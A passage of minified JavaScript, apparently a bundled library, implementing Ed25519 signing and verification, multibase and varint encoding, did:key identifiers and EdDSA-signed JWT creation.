              , al = _s(Ja * ol)
              , cl = _s(rl * Ya)
              , ll = _s(Xa * ol)
              , ul = _s(il * Ya);
            return al === cl && ll === ul
        }
        is0() {
            return this.equals(Zs.ZERO)
        }
        negate() {
            return new Zs(_s(-this.ex),this.ey,this.ez,_s(-this.et))
        }
        double() {
            const {a: Ws} = U
              , {ex: Ja, ey: Xa, ez: Ya} = this
              , rl = _s(Ja * Ja)
              , il = _s(Xa * Xa)
              , ol = _s(yt$1 * _s(Ya * Ya))
              , al = _s(Ws * rl)
              , cl = Ja + Xa
              , ll = _s(_s(cl * cl) - rl - il)
              , ul = al + il
              , dl = ul - ol
              , fl = al - il
              , hl = _s(ll * dl)
              , pl = _s(ul * fl)
              , gl = _s(ll * fl)
              , yl = _s(dl * ul);
            return new Zs(hl,pl,yl,gl)
        }
        add(Ws) {
            Hs(Ws);
            const {a: Ja, d: Xa} = U
              , {ex: Ya, ey: rl, ez: il, et: ol} = this
              , {ex: al, ey: cl, ez: ll, et: ul} = Ws;
            if (Ja === BigInt(-1)) {
                const El = _s((rl - Ya) * (cl + al))
                  , vl = _s((rl + Ya) * (cl - al))
                  , bl = _s(vl - El);
                if (bl === G$2)
                    return this.double();
                const _l = _s(il * yt$1 * ul)
                  , Il = _s(ol * yt$1 * ll)
                  , xl = Il + _l
                  , Sl = vl + El
                  , Dl = Il - _l
                  , Bl = _s(xl * bl)
                  , Ul = _s(Sl * Dl)
                  , Fl = _s(xl * Dl)
                  , Ll = _s(bl * Sl);
                return new Zs(Bl,Ul,Ll,Fl)
            }
            const dl = _s(Ya * al)
              , fl = _s(rl * cl)
              , hl = _s(ol * Xa * ul)
              , pl = _s(il * ll)
              , gl = _s((Ya + rl) * (al + cl) - dl - fl)
              , yl = pl - hl
              , $l = pl + hl
              , wl = _s(fl - Ja * dl)
              , ml = _s(gl * yl)
              , Cl = _s($l * wl)
              , Pl = _s(gl * wl)
              , Nl = _s(yl * $l);
            return new Zs(ml,Cl,Nl,Pl)
        }
        subtract(Ws) {
            return this.add(Ws.negate())
        }
        wNAF(Ws) {
            return nl.wNAFCached(this, Ws, Zs.normalizeZ)
        }
        multiply(Ws) {
            const Ja = Ws;
            ft$1("scalar", Ja, j, oe);
            const {p: Xa, f: Ya} = this.wNAF(Ja);
            return Zs.normalizeZ([Xa, Ya])[0]
        }
        multiplyUnsafe(Ws, Ja=Zs.ZERO) {
            const Xa = Ws;
            return ft$1("scalar", Xa, G$2, oe),
            Xa === G$2 ? Ga : this.is0() || Xa === j ? this : nl.wNAFCachedUnsafe(this, Xa, Zs.normalizeZ, Ja)
        }
        isSmallOrder() {
            return this.multiplyUnsafe(Es).is0()
        }
        isTorsionFree() {
            return nl.unsafeLadder(this, oe).is0()
        }
        toAffine(Ws) {
            return ha(this, Ws)
        }
        clearCofactor() {
            const {h: Ws} = U;
            return Ws === j ? this : this.multiplyUnsafe(Ws)
        }
        static fromHex(Ws, Ja=!1) {
            const {d: Xa, a: Ya} = U
              , rl = Z.BYTES;
            Ws = W$2("pointHex", Ws, rl),
            Tt$2("zip215", Ja);
            const il = Ws.slice()
              , ol = Ws[rl - 1];
            il[rl - 1] = ol & -129;
            const al = Et$3(il)
              , cl = Ja ? vs : Z.ORDER;
            ft$1("pointHex.y", al, G$2, cl);
            const ll = _s(al * al)
              , ul = _s(ll - j)
              , dl = _s(Xa * ll - Ya);
            let {isValid: fl, value: hl} = Ss(ul, dl);
            if (!fl)
                throw new Error("Point.fromHex: invalid y coordinate");
            const pl = (hl & j) === j
              , gl = (ol & 128) !== 0;
            if (!Ja && hl === G$2 && gl)
                throw new Error("Point.fromHex: x=0 and x_0=1");
            return gl !== pl && (hl = _s(-hl)),
            Zs.fromAffine({
                x: hl,
                y: al
            })
        }
        static fromPrivateKey(Ws) {
            return Bs(Ws).point
        }
        toRawBytes() {
            const {x: Ws, y: Ja} = this.toAffine()
              , Xa = Nt$2(Ja, Z.BYTES);
            return Xa[Xa.length - 1] |= Ws & j ? 128 : 0,
            Xa
        }
        toHex() {
            return Ft$1(this.toRawBytes())
        }
    }
    Zs.BASE = new Zs(U.Gx,U.Gy,j,_s(U.Gx * U.Gy)),
    Zs.ZERO = new Zs(G$2,j,j,G$2);
    const {BASE: Qa, ZERO: Ga} = Zs
      , nl = lr$1(Zs, ms * 8);
    function sl(za) {
        return H(za, oe)
    }
    function el(za) {
        return sl(Et$3(za))
    }
    function Bs(za) {
        const Ws = Z.BYTES;
        za = W$2("private key", za, Ws);
        const Ja = W$2("hashed private key", st(za), 2 * Ws)
          , Xa = Ts(Ja.slice(0, Ws))
          , Ya = Ja.slice(Ws, 2 * Ws)
          , rl = el(Xa)
          , il = Qa.multiply(rl)
          , ol = il.toRawBytes();
        return {
            head: Xa,
            prefix: Ya,
            scalar: rl,
            point: il,
            pointBytes: ol
        }
    }
    function Fa(za) {
        return Bs(za).pointBytes
    }
    function Js(za=new Uint8Array, ...Ws) {
        const Ja = ye$2(...Ws);
        return el(st(Rs(Ja, W$2("context", za), !!et)))
    }
    function Wa(za, Ws, Ja={}) {
        za = W$2("message", za),
        et && (za = et(za));
        const {prefix: Xa, scalar: Ya, pointBytes: rl} = Bs(Ws)
          , il = Js(Ja.context, Xa, za)
          , ol = Qa.multiply(il).toRawBytes()
          , al = Js(Ja.context, ol, rl, za)
          , cl = sl(il + al * Ya);
        ft$1("signature.s", cl, G$2, oe);
        const ll = ye$2(ol, Nt$2(cl, Z.BYTES));
        return W$2("result", ll, Z.BYTES * 2)
    }
    const Za = Er$2;
    function tl(za, Ws, Ja, Xa=Za) {
        const {context: Ya, zip215: rl} = Xa
          , il = Z.BYTES;
        za = W$2("signature", za, 2 * il),
        Ws = W$2("message", Ws),
        Ja = W$2("publicKey", Ja, il),
        rl !== void 0 && Tt$2("zip215", rl),
        et && (Ws = et(Ws));
        const ol = Et$3(za.slice(il, 2 * il));
        let al, cl, ll;
        try {
            al = Zs.fromHex(Ja, rl),
            cl = Zs.fromHex(za.slice(0, il), rl),
            ll = Qa.multiplyUnsafe(ol)
        } catch {
            return !1
        }
        if (!rl && al.isSmallOrder())
            return !1;
        const ul = Js(Ya, cl.toRawBytes(), al.toRawBytes(), Ws);
        return cl.add(al.multiplyUnsafe(ul)).subtract(ll).clearCofactor().equals(Zs.ZERO)
    }
    return Qa._setWindowSize(8),
    {
        CURVE: U,
        getPublicKey: Fa,
        sign: Wa,
        verify: tl,
        ExtendedPoint: Zs,
        utils: {
            getExtendedPublicKey: Bs,
            randomPrivateKey: () => ws(Z.BYTES),
            precompute(za=8, Ws=Zs.BASE) {
                return Ws._setWindowSize(za),
                Ws.multiply(BigInt(3)),
                Ws
            }
        }
    }
}
BigInt(0),
BigInt(1);
const kt$2 = BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949")
  , Ue$2 = BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");
BigInt(0);
const xr$2 = BigInt(1)
  , Te$2 = BigInt(2);
BigInt(3);
const Br$2 = BigInt(5)
  , Cr$2 = BigInt(8);
function Ar$2(q) {
    const U = BigInt(10)
      , Z = BigInt(20)
      , oe = BigInt(40)
      , et = BigInt(80)
      , st = kt$2
      , ws = q * q % st * q % st
      , ms = J$1(ws, Te$2, st) * ws % st
      , Es = J$1(ms, xr$2, st) * q % st
      , vs = J$1(Es, Br$2, st) * Es % st
      , _s = J$1(vs, U, st) * vs % st
      , Is = J$1(_s, Z, st) * _s % st
      , Ss = J$1(Is, oe, st) * Is % st
      , Ts = J$1(Ss, et, st) * Ss % st
      , Rs = J$1(Ts, et, st) * Ss % st
      , Ns = J$1(Rs, U, st) * vs % st;
    return {
        pow_p_5_8: J$1(Ns, Te$2, st) * q % st,
        b2: ws
    }
}
function mr$2(q) {
    return q[0] &= 248,
    q[31] &= 127,
    q[31] |= 64,
    q
}
function _r$2(q, U) {
    const Z = kt$2
      , oe = H(U * U * U, Z)
      , et = H(oe * oe * U, Z)
      , st = Ar$2(q * et).pow_p_5_8;
    let ws = H(q * oe * st, Z);
    const ms = H(U * ws * ws, Z)
      , Es = ws
      , vs = H(ws * Ue$2, Z)
      , _s = ms === q
      , Is = ms === H(-q, Z)
      , Ss = ms === H(-q * Ue$2, Z);
    return _s && (ws = Es),
    (Is || Ss) && (ws = vs),
    ur$1(ws, Z) && (ws = H(-ws, Z)),
    {
        isValid: _s || Is,
        value: ws
    }
}
const Sr$2 = ( () => _e$3(kt$2, void 0, !0))()
  , vr$2 = ( () => ({
    a: BigInt(-1),
    d: BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),
    Fp: Sr$2,
    n: BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),
    h: Cr$2,
    Gx: BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),
    Gy: BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),
    hash: Kn$1,
    randomBytes: he$2,
    adjustScalarBytes: mr$2,
    uvRatio: _r$2
}))()
  , Rt$3 = ( () => yr$2(vr$2))()
  , jt$2 = "EdDSA"
  , Zt$2 = "JWT"
  , ut$2 = "."
  , Dt$1 = "base64url"
  , Gt$2 = "utf8"
  , xt$2 = "utf8"
  , Vt$2 = ":"
  , Yt$2 = "did"
  , Jt$2 = "key"
  , dt$2 = "base58btc"
  , Kt$2 = "z"
  , Wt$2 = "K36"
  , Ne$1 = 32;
function Xt$2(q) {
    return globalThis.Buffer != null ? new Uint8Array(q.buffer,q.byteOffset,q.byteLength) : q
}
function Le$3(q=0) {
    return globalThis.Buffer != null && globalThis.Buffer.allocUnsafe != null ? Xt$2(globalThis.Buffer.allocUnsafe(q)) : new Uint8Array(q)
}
function Oe$1(q, U) {
    U || (U = q.reduce( (et, st) => et + st.length, 0));
    const Z = Le$3(U);
    let oe = 0;
    for (const et of q)
        Z.set(et, oe),
        oe += et.length;
    return Xt$2(Z)
}
function Ir$2(q, U) {
    if (q.length >= 255)
        throw new TypeError("Alphabet too long");
    for (var Z = new Uint8Array(256), oe = 0; oe < Z.length; oe++)
        Z[oe] = 255;
    for (var et = 0; et < q.length; et++) {
        var st = q.charAt(et)
          , ws = st.charCodeAt(0);
        if (Z[ws] !== 255)
            throw new TypeError(st + " is ambiguous");
        Z[ws] = et
    }
    var ms = q.length
      , Es = q.charAt(0)
      , vs = Math.log(ms) / Math.log(256)
      , _s = Math.log(256) / Math.log(ms);
    function Is(Rs) {
        if (Rs instanceof Uint8Array || (ArrayBuffer.isView(Rs) ? Rs = new Uint8Array(Rs.buffer,Rs.byteOffset,Rs.byteLength) : Array.isArray(Rs) && (Rs = Uint8Array.from(Rs))),
        !(Rs instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
        if (Rs.length === 0)
            return "";
        for (var Ns = 0, Hs = 0, ha = 0, pa = Rs.length; ha !== pa && Rs[ha] === 0; )
            ha++,
            Ns++;
        for (var Zs = (pa - ha) * _s + 1 >>> 0, Qa = new Uint8Array(Zs); ha !== pa; ) {
            for (var Ga = Rs[ha], nl = 0, sl = Zs - 1; (Ga !== 0 || nl < Hs) && sl !== -1; sl--,
            nl++)
                Ga += 256 * Qa[sl] >>> 0,
                Qa[sl] = Ga % ms >>> 0,
                Ga = Ga / ms >>> 0;
            if (Ga !== 0)
                throw new Error("Non-zero carry");
            Hs = nl,
            ha++
        }
        for (var el = Zs - Hs; el !== Zs && Qa[el] === 0; )
            el++;
        for (var Bs = Es.repeat(Ns); el < Zs; ++el)
            Bs += q.charAt(Qa[el]);
        return Bs
    }
    function Ss(Rs) {
        if (typeof Rs != "string")
            throw new TypeError("Expected String");
        if (Rs.length === 0)
            return new Uint8Array;
        var Ns = 0;
        if (Rs[Ns] !== " ") {
            for (var Hs = 0, ha = 0; Rs[Ns] === Es; )
                Hs++,
                Ns++;
            for (var pa = (Rs.length - Ns) * vs + 1 >>> 0, Zs = new Uint8Array(pa); Rs[Ns]; ) {
                var Qa = Z[Rs.charCodeAt(Ns)];
                if (Qa === 255)
                    return;
                for (var Ga = 0, nl = pa - 1; (Qa !== 0 || Ga < ha) && nl !== -1; nl--,
                Ga++)
                    Qa += ms * Zs[nl] >>> 0,
                    Zs[nl] = Qa % 256 >>> 0,
                    Qa = Qa / 256 >>> 0;
                if (Qa !== 0)
                    throw new Error("Non-zero carry");
                ha = Ga,
                Ns++
            }
            if (Rs[Ns] !== " ") {
                for (var sl = pa - ha; sl !== pa && Zs[sl] === 0; )
                    sl++;
                for (var el = new Uint8Array(Hs + (pa - sl)), Bs = Hs; sl !== pa; )
                    el[Bs++] = Zs[sl++];
                return el
            }
        }
    }
    function Ts(Rs) {
        var Ns = Ss(Rs);
        if (Ns)
            return Ns;
        throw new Error(`Non-${U} character`)
    }
    return {
        encode: Is,
        decodeUnsafe: Ss,
        decode: Ts
    }
}
var Ur$2 = Ir$2
  , Tr$2 = Ur$2;
const He$2 = q => {
    if (q instanceof Uint8Array && q.constructor.name === "Uint8Array")
        return q;
    if (q instanceof ArrayBuffer)
        return new Uint8Array(q);
    if (ArrayBuffer.isView(q))
        return new Uint8Array(q.buffer,q.byteOffset,q.byteLength);
    throw new Error("Unknown type, must be binary type")
}
  , Fr$1 = q => new TextEncoder().encode(q)
  , Nr$2 = q => new TextDecoder().decode(q);
let Lr$2 = class {
    constructor(U, Z, oe) {
        this.name = U,
        this.prefix = Z,
        this.baseEncode = oe
    }
    encode(U) {
        if (U instanceof Uint8Array)
            return `${this.prefix}${this.baseEncode(U)}`;
        throw Error("Unknown type, must be binary type")
    }
}
  , Or$2 = class {
    constructor(U, Z, oe) {
        if (this.name = U,
        this.prefix = Z,
        Z.codePointAt(0) === void 0)
            throw new Error("Invalid prefix character");
        this.prefixCodePoint = Z.codePointAt(0),
        this.baseDecode = oe
    }
    decode(U) {
        if (typeof U == "string") {
            if (U.codePointAt(0) !== this.prefixCodePoint)
                throw Error(`Unable to decode multibase string ${JSON.stringify(U)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);
            return this.baseDecode(U.slice(this.prefix.length))
        } else
            throw Error("Can only multibase decode strings")
    }
    or(U) {
        return ze$1(this, U)
    }
}
  , Hr$2 = class {
    constructor(U) {
        this.decoders = U
    }
    or(U) {
        return ze$1(this, U)
    }
    decode(U) {
        const Z = U[0]
          , oe = this.decoders[Z];
        if (oe)
            return oe.decode(U);
        throw RangeError(`Unable to decode multibase string ${JSON.stringify(U)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)
    }
}
;
const ze$1 = (q, U) => new Hr$2({
    ...q.decoders || {
        [q.prefix]: q
    },
    ...U.decoders || {
        [U.prefix]: U
    }
});
let zr$1 = class {
    constructor(U, Z, oe, et) {
        this.name = U,
        this.prefix = Z,
        this.baseEncode = oe,
        this.baseDecode = et,
        this.encoder = new Lr$2(U,Z,oe),
        this.decoder = new Or$2(U,Z,et)
    }
    encode(U) {
        return this.encoder.encode(U)
    }
    decode(U) {
        return this.decoder.decode(U)
    }
}
;
const Bt$2 = ({name: q, prefix: U, encode: Z, decode: oe}) => new zr$1(q,U,Z,oe)
  , ht$2 = ({prefix: q, name: U, alphabet: Z}) => {
    const {encode: oe, decode: et} = Tr$2(Z, U);
    return Bt$2({
        prefix: q,
        name: U,
        encode: oe,
        decode: st => He$2(et(st))
    })
}
  , Mr$2 = (q, U, Z, oe) => {
    const et = {};
    for (let _s = 0; _s < U.length; ++_s)
        et[U[_s]] = _s;
    let st = q.length;
    for (; q[st - 1] === "="; )
        --st;
    const ws = new Uint8Array(st * Z / 8 | 0);
    let ms = 0
      , Es = 0
      , vs = 0;
    for (let _s = 0; _s < st; ++_s) {
        const Is = et[q[_s]];
        if (Is === void 0)
            throw new SyntaxError(`Non-${oe} character`);
        Es = Es << Z | Is,
        ms += Z,
        ms >= 8 && (ms -= 8,
        ws[vs++] = 255 & Es >> ms)
    }
    if (ms >= Z || 255 & Es << 8 - ms)
        throw new SyntaxError("Unexpected end of data");
    return ws
}
  , qr$2 = (q, U, Z) => {
    const oe = U[U.length - 1] === "="
      , et = (1 << Z) - 1;
    let st = ""
      , ws = 0
      , ms = 0;
    for (let Es = 0; Es < q.length; ++Es)
        for (ms = ms << 8 | q[Es],
        ws += 8; ws > Z; )
            ws -= Z,
            st += U[et & ms >> ws];
    if (ws && (st += U[et & ms << Z - ws]),
    oe)
        for (; st.length * Z & 7; )
            st += "=";
    return st
}
  , k$1 = ({name: q, prefix: U, bitsPerChar: Z, alphabet: oe}) => Bt$2({
    prefix: U,
    name: q,
    encode(et) {
        return qr$2(et, oe, Z)
    },
    decode(et) {
        return Mr$2(et, oe, Z, q)
    }
})
  , $r$2 = Bt$2({
    prefix: "\0",
    name: "identity",
    encode: q => Nr$2(q),
    decode: q => Fr$1(q)
});
var kr$2 = Object.freeze({
    __proto__: null,
    identity: $r$2
});
const Rr$2 = k$1({
    prefix: "0",
    name: "base2",
    alphabet: "01",
    bitsPerChar: 1
});
var jr$2 = Object.freeze({
    __proto__: null,
    base2: Rr$2
});
const Zr$2 = k$1({
    prefix: "7",
    name: "base8",
    alphabet: "01234567",
    bitsPerChar: 3
});
var Gr$2 = Object.freeze({
    __proto__: null,
    base8: Zr$2
});
const Vr$2 = ht$2({
    prefix: "9",
    name: "base10",
    alphabet: "0123456789"
});
var Yr$1 = Object.freeze({
    __proto__: null,
    base10: Vr$2
});
const Jr$1 = k$1({
    prefix: "f",
    name: "base16",
    alphabet: "0123456789abcdef",
    bitsPerChar: 4
})
  , Kr$1 = k$1({
    prefix: "F",
    name: "base16upper",
    alphabet: "0123456789ABCDEF",
    bitsPerChar: 4
});
var Wr$2 = Object.freeze({
    __proto__: null,
    base16: Jr$1,
    base16upper: Kr$1
});
const Xr$2 = k$1({
    prefix: "b",
    name: "base32",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567",
    bitsPerChar: 5
})
  , Pr$2 = k$1({
    prefix: "B",
    name: "base32upper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
    bitsPerChar: 5
})
  , Qr$2 = k$1({
    prefix: "c",
    name: "base32pad",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567=",
    bitsPerChar: 5
})
  , to$2 = k$1({
    prefix: "C",
    name: "base32padupper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",
    bitsPerChar: 5
})
  , eo$2 = k$1({
    prefix: "v",
    name: "base32hex",
    alphabet: "0123456789abcdefghijklmnopqrstuv",
    bitsPerChar: 5
})
  , no$2 = k$1({
    prefix: "V",
    name: "base32hexupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV",
    bitsPerChar: 5
})
  , ro$2 = k$1({
    prefix: "t",
    name: "base32hexpad",
    alphabet: "0123456789abcdefghijklmnopqrstuv=",
    bitsPerChar: 5
})
  , oo$2 = k$1({
    prefix: "T",
    name: "base32hexpadupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV=",
    bitsPerChar: 5
})
  , so$2 = k$1({
    prefix: "h",
    name: "base32z",
    alphabet: "ybndrfg8ejkmcpqxot1uwisza345h769",
    bitsPerChar: 5
});
var io$2 = Object.freeze({
    __proto__: null,
    base32: Xr$2,
    base32upper: Pr$2,
    base32pad: Qr$2,
    base32padupper: to$2,
    base32hex: eo$2,
    base32hexupper: no$2,
    base32hexpad: ro$2,
    base32hexpadupper: oo$2,
    base32z: so$2
});
const uo$2 = ht$2({
    prefix: "k",
    name: "base36",
    alphabet: "0123456789abcdefghijklmnopqrstuvwxyz"
})
  , co$2 = ht$2({
    prefix: "K",
    name: "base36upper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
});
var ao$2 = Object.freeze({
    __proto__: null,
    base36: uo$2,
    base36upper: co$2
});
const fo$2 = ht$2({
    name: "base58btc",
    prefix: "z",
    alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
})
  , Do$2 = ht$2({
    name: "base58flickr",
    prefix: "Z",
    alphabet: "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"
});
var ho$2 = Object.freeze({
    __proto__: null,
    base58btc: fo$2,
    base58flickr: Do$2
});
const lo$2 = k$1({
    prefix: "m",
    name: "base64",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    bitsPerChar: 6
})
  , bo$2 = k$1({
    prefix: "M",
    name: "base64pad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    bitsPerChar: 6
})
  , po$2 = k$1({
    prefix: "u",
    name: "base64url",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
    bitsPerChar: 6
})
  , wo$2 = k$1({
    prefix: "U",
    name: "base64urlpad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",
    bitsPerChar: 6
});
var Eo$2 = Object.freeze({
    __proto__: null,
    base64: lo$2,
    base64pad: bo$2,
    base64url: po$2,
    base64urlpad: wo$2
});
const Me$3 = Array.from("🚀🪐☄🛰🌌🌑🌒🌓🌔🌕🌖🌗🌘🌍🌏🌎🐉☀💻🖥💾💿😂❤😍🤣😊🙏💕😭😘👍😅👏😁🔥🥰💔💖💙😢🤔😆🙄💪😉☺👌🤗💜😔😎😇🌹🤦🎉💞✌✨🤷😱😌🌸🙌😋💗💚😏💛🙂💓🤩😄😀🖤😃💯🙈👇🎶😒🤭❣😜💋👀😪😑💥🙋😞😩😡🤪👊🥳😥🤤👉💃😳✋😚😝😴🌟😬🙃🍀🌷😻😓⭐✅🥺🌈😈🤘💦✔😣🏃💐☹🎊💘😠☝😕🌺🎂🌻😐🖕💝🙊😹🗣💫💀👑🎵🤞😛🔴😤🌼😫⚽🤙☕🏆🤫👈😮🙆🍻🍃🐶💁😲🌿🧡🎁⚡🌞🎈❌✊👋😰🤨😶🤝🚶💰🍓💢🤟🙁🚨💨🤬✈🎀🍺🤓😙💟🌱😖👶🥴▶➡❓💎💸⬇😨🌚🦋😷🕺⚠🙅😟😵👎🤲🤠🤧📌🔵💅🧐🐾🍒😗🤑🌊🤯🐷☎💧😯💆👆🎤🙇🍑❄🌴💣🐸💌📍🥀🤢👅💡💩👐📸👻🤐🤮🎼🥵🚩🍎🍊👼💍📣🥂")
  , go$2 = Me$3.reduce( (q, U, Z) => (q[Z] = U,
q), [])
  , yo$2 = Me$3.reduce( (q, U, Z) => (q[U.codePointAt(0)] = Z,
q), []);
function xo$2(q) {
    return q.reduce( (U, Z) => (U += go$2[Z],
    U), "")
}
function Bo$2(q) {
    const U = [];
    for (const Z of q) {
        const oe = yo$2[Z.codePointAt(0)];
        if (oe === void 0)
            throw new Error(`Non-base256emoji character: ${Z}`);
        U.push(oe)
    }
    return new Uint8Array(U)
}
const Co$2 = Bt$2({
    prefix: "🚀",
    name: "base256emoji",
    encode: xo$2,
    decode: Bo$2
});
var Ao$2 = Object.freeze({
    __proto__: null,
    base256emoji: Co$2
})
  , mo$2 = $e$2
  , qe$2 = 128
  , _o$2 = 127
  , So$2 = ~_o$2
  , vo$2 = Math.pow(2, 31);
function $e$2(q, U, Z) {
    U = U || [],
    Z = Z || 0;
    for (var oe = Z; q >= vo$2; )
        U[Z++] = q & 255 | qe$2,
        q /= 128;
    for (; q & So$2; )
        U[Z++] = q & 255 | qe$2,
        q >>>= 7;
    return U[Z] = q | 0,
    $e$2.bytes = Z - oe + 1,
    U
}
var Io$2 = Pt$2
  , Uo$2 = 128
  , ke$3 = 127;
function Pt$2(q, oe) {
    var Z = 0, oe = oe || 0, et = 0, st = oe, ws, ms = q.length;
    do {
        if (st >= ms)
            throw Pt$2.bytes = 0,
            new RangeError("Could not decode varint");
        ws = q[st++],
        Z += et < 28 ? (ws & ke$3) << et : (ws & ke$3) * Math.pow(2, et),
        et += 7
    } while (ws >= Uo$2);
    return Pt$2.bytes = st - oe,
    Z
}
var To$2 = Math.pow(2, 7)
  , Fo$2 = Math.pow(2, 14)
  , No$2 = Math.pow(2, 21)
  , Lo$2 = Math.pow(2, 28)
  , Oo$2 = Math.pow(2, 35)
  , Ho$2 = Math.pow(2, 42)
  , zo$2 = Math.pow(2, 49)
  , Mo$2 = Math.pow(2, 56)
  , qo$2 = Math.pow(2, 63)
  , $o$2 = function(q) {
    return q < To$2 ? 1 : q < Fo$2 ? 2 : q < No$2 ? 3 : q < Lo$2 ? 4 : q < Oo$2 ? 5 : q < Ho$2 ? 6 : q < zo$2 ? 7 : q < Mo$2 ? 8 : q < qo$2 ? 9 : 10
}
  , ko$2 = {
    encode: mo$2,
    decode: Io$2,
    encodingLength: $o$2
}
  , Re$1 = ko$2;
const je$2 = (q, U, Z=0) => (Re$1.encode(q, U, Z),
U)
  , Ze$2 = q => Re$1.encodingLength(q)
  , Qt$2 = (q, U) => {
    const Z = U.byteLength
      , oe = Ze$2(q)
      , et = oe + Ze$2(Z)
      , st = new Uint8Array(et + Z);
    return je$2(q, st, 0),
    je$2(Z, st, oe),
    st.set(U, et),
    new Ro$2(q,Z,U,st)
}
;
let Ro$2 = class {
    constructor(U, Z, oe, et) {
        this.code = U,
        this.size = Z,
        this.digest = oe,
        this.bytes = et
    }
}
;
const Ge$1 = ({name: q, code: U, encode: Z}) => new jo$2(q,U,Z);
let jo$2 = class {
    constructor(U, Z, oe) {
        this.name = U,
        this.code = Z,
        this.encode = oe
    }
    digest(U) {
        if (U instanceof Uint8Array) {
            const Z = this.encode(U);
            return Z instanceof Uint8Array ? Qt$2(this.code, Z) : Z.then(oe => Qt$2(this.code, oe))
        } else
            throw Error("Unknown type, must be binary type")
    }
}
;
const Ve$2 = q => async U => new Uint8Array(await crypto.subtle.digest(q, U))
  , Zo$2 = Ge$1({
    name: "sha2-256",
    code: 18,
    encode: Ve$2("SHA-256")
})
  , Go$2 = Ge$1({
    name: "sha2-512",
    code: 19,
    encode: Ve$2("SHA-512")
});
var Vo$2 = Object.freeze({
    __proto__: null,
    sha256: Zo$2,
    sha512: Go$2
});
const Ye$2 = 0
  , Yo$2 = "identity"
  , Je$1 = He$2
  , Jo$2 = q => Qt$2(Ye$2, Je$1(q))
  , Ko$2 = {
    code: Ye$2,
    name: Yo$2,
    encode: Je$1,
    digest: Jo$2
};
var Wo$2 = Object.freeze({
    __proto__: null,
    identity: Ko$2
});
new TextEncoder,
new TextDecoder;
const Ke$2 = {
    ...kr$2,
    ...jr$2,
    ...Gr$2,
    ...Yr$1,
    ...Wr$2,
    ...io$2,
    ...ao$2,
    ...ho$2,
    ...Eo$2,
    ...Ao$2
};
({
    ...Vo$2,
    ...Wo$2
});
function We$1(q, U, Z, oe) {
    return {
        name: q,
        prefix: U,
        encoder: {
            name: q,
            prefix: U,
            encode: Z
        },
        decoder: {
            decode: oe
        }
    }
}
const Xe$2 = We$1("utf8", "u", q => "u" + new TextDecoder("utf8").decode(q), q => new TextEncoder().encode(q.substring(1)))
  , te$1 = We$1("ascii", "a", q => {
    let U = "a";
    for (let Z = 0; Z < q.length; Z++)
        U += String.fromCharCode(q[Z]);
    return U
}
, q => {
    q = q.substring(1);
    const U = Le$3(q.length);
    for (let Z = 0; Z < q.length; Z++)
        U[Z] = q.charCodeAt(Z);
    return U
}
)
  , Pe$1 = {
    utf8: Xe$2,
    "utf-8": Xe$2,
    hex: Ke$2.base16,
    latin1: te$1,
    ascii: te$1,
    binary: te$1,
    ...Ke$2
};
function ct$1(q, U="utf8") {
    const Z = Pe$1[U];
    if (!Z)
        throw new Error(`Unsupported encoding "${U}"`);
    return (U === "utf8" || U === "utf-8") && globalThis.Buffer != null && globalThis.Buffer.from != null ? globalThis.Buffer.from(q.buffer, q.byteOffset, q.byteLength).toString("utf8") : Z.encoder.encode(q).substring(1)
}
function rt$1(q, U="utf8") {
    const Z = Pe$1[U];
    if (!Z)
        throw new Error(`Unsupported encoding "${U}"`);
    return (U === "utf8" || U === "utf-8") && globalThis.Buffer != null && globalThis.Buffer.from != null ? Xt$2(globalThis.Buffer.from(q, "utf-8")) : Z.decoder.decode(`${Z.prefix}${q}`)
}
function lt$1(q) {
    return safeJsonParse(ct$1(rt$1(q, Dt$1), Gt$2))
}
function bt$1(q) {
    return ct$1(rt$1(safeJsonStringify(q), Gt$2), Dt$1)
}
function Qe$2(q) {
    const U = rt$1(Wt$2, dt$2)
      , Z = Kt$2 + ct$1(Oe$1([U, q]), dt$2);
    return [Yt$2, Jt$2, Z].join(Vt$2)
}
function en$2(q) {
    return ct$1(q, Dt$1)
}
function nn$2(q) {
    return rt$1(q, Dt$1)
}
function rn$2(q) {
    return rt$1([bt$1(q.header), bt$1(q.payload)].join(ut$2), xt$2)
}
function on$2(q) {
    return [bt$1(q.header), bt$1(q.payload), en$2(q.signature)].join(ut$2)
}
function sn$2(q) {
    const U = q.split(ut$2)
      , Z = lt$1(U[0])
      , oe = lt$1(U[1])
      , et = nn$2(U[2])
      , st = rt$1(U.slice(0, 2).join(ut$2), xt$2);
    return {
        header: Z,
        payload: oe,
        signature: et,
        data: st
    }
}
function Po$2(q=he$2(Ne$1)) {
    const U = Rt$3.getPublicKey(q);
    return {
        secretKey: Oe$1([q, U]),
        publicKey: U
    }
}
async function Qo$1(q, U, Z, oe, et=cjs$3.fromMiliseconds(Date.now())) {
    const st = {
        alg: jt$2,
        typ: Zt$2
    }
      , ws = Qe$2(oe.publicKey)
      , ms = et + Z
      , Es = {
        iss: ws,
        sub: q,
        aud: U,
        iat: et,
        exp: ms
    }
      , vs = rn$2({
        header: st,
        payload: Es
    })
